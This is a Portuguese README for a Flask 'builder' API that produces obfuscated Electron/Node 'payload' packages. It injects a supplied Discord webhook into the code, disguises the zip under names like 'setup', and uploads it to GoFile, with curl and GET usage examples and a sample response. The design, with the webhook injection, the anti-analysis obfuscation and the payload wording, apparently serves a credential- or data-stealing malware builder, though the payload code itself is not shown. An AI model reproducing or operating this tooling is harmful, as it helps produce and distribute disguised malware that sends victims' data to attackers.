# 🚀 Konu Electron API Builder (Flask)

API Builder em Flask modular com arquitetura organizada em rotas (`./routes/`), serviços (`./services/`), suporte a builds concorrentes isolados na pasta `./build/<build_id>/`, ofuscação avançada de código JavaScript (todos os `modules/` e o `index.js`), injeção automática de Webhook e upload automático para o **GoFile**.

---

## 📁 Estrutura do Projeto

```
Konu/
├── builder/
│   ├── app.py                      # Ponto de entrada da API Flask
│   ├── config.py                   # Configurações globais (Porta, Host, GoFile Token)
│   ├── requirements.txt            # Dependências Python (Flask, requests)
│   ├── routes/
│   │   ├── __init__.py             # Registro dos Blueprints
│   │   ├── build.py                # Endpoint /build (GET e POST)
│   │   └── health.py               # Endpoint / e /health
│   ├── services/
│   │   ├── __init__.py
│   │   ├── builder_service.py      # Gerenciamento de pastas isoladas, substituição de webhook e zip
│   │   ├── obfuscator_service.py   # Execução da ofuscação JavaScript
│   │   └── gofile_service.py       # Integração com a API REST do GoFile
│   └── scripts/
│       └── obfuscate.js            # Script Node com javascript-obfuscator
├── build/                          # Diretório de builds isolados (ex: ./build/8760968435/)
├── modules/                        # Módulos originais Electron/Node
└── index.js                        # Ponto de entrada do payload
```

---

## ⚙️ Como Executar a API

### 1. Iniciar o servidor
```bash
python builder/app.py
```
O servidor será iniciado por padrão em `http://localhost:5000`.

---

## 🌐 Endpoint de Build

### `GET` / `POST` `/build`

#### Parâmetros aceitos (Query Parameters ou JSON Body):
| Parâmetro | Tipo | Obrigatório | Descrição |
| :--- | :--- | :--- | :--- |
| `webhook` | `string` | **Sim** | URL do Webhook do Discord para injetar no `config.js` |
| `os` | `string` | Não (default: `windows`) | Sistema operacional alvo (`windows`, `linux`, `macos`) |
| `filename` | `string` | Não (default: `konu_electron`) | Nome do arquivo `.zip` final |
| `token` | `string` | Não | Token de conta GoFile (se omitido, gera upload público/guest) |

---

### 📌 Exemplos de Uso

#### Exemplo via Navegador / GET:
```
http://localhost:5000/build?webhook=https://discord.com/api/webhooks/SEU_WEBHOOK&os=windows&filename=meu_payload
```

#### Exemplo via cURL:
```bash
curl -X GET "http://localhost:5000/build?webhook=https://discord.com/api/webhooks/123/abc&os=windows&filename=setup"
```

#### Exemplo via POST (JSON):
```bash
curl -X POST http://localhost:5000/build \
  -H "Content-Type: application/json" \
  -d '{
    "webhook": "https://discord.com/api/webhooks/123/abc",
    "os": "windows",
    "filename": "meu_app"
  }'
```

---

### 📦 Resposta da API (Exemplo)

```json
{
  "status": "ok",
  "build_id": "8760968435",
  "filename": "meu_app.zip",
  "os": "windows",
  "size_bytes": 62434,
  "download_url": "https://gofile.io/d/UJAAy2zw",
  "direct_link": null,
  "gofile_data": {
    "code": "3UsSSNoA",
    "downloadPage": "https://gofile.io/d/UJAAy2zw",
    "guestToken": "UvNLOdvtRBqMpu24oYFf4fLLzxCZtTbt",
    "id": "46336af4-270f-42b5-9bbc-ea606145441d",
    "name": "meu_app.zip",
    "size": 62434
  },
  "build_path": "C:\\Users\\...\\Konu\\build\\8760968435"
}
```

---

## 🔒 Processo de Build e Segurança

1. **Isolamento Concorrente**: Cada requisição gera uma pasta única (ex: `./build/8760968435/`), permitindo centenas de builds simultâneos sem conflito.
2. **Substituição de Webhook**: Substitui dinamicamente `%WEBHOOK%` e o campo `webhookUrl` em `modules/webhook/config.js`.
3. **Ofuscação Robusta**: Ofusca recursivamente todos os arquivos em `modules/` e o `index.js` utilizando transformações avançadas (String Array, Base64, Control Flow Flattening, Number Expressions, Hex Identifiers).
4. **Compactação**: Empacota o código em um arquivo `.zip` com o nome solicitado.
5. **Upload GoFile**: Envia o arquivo diretamente para a API do GoFile (`https://upload.gofile.io/uploadfile`) e retorna a URL de download instantaneamente.
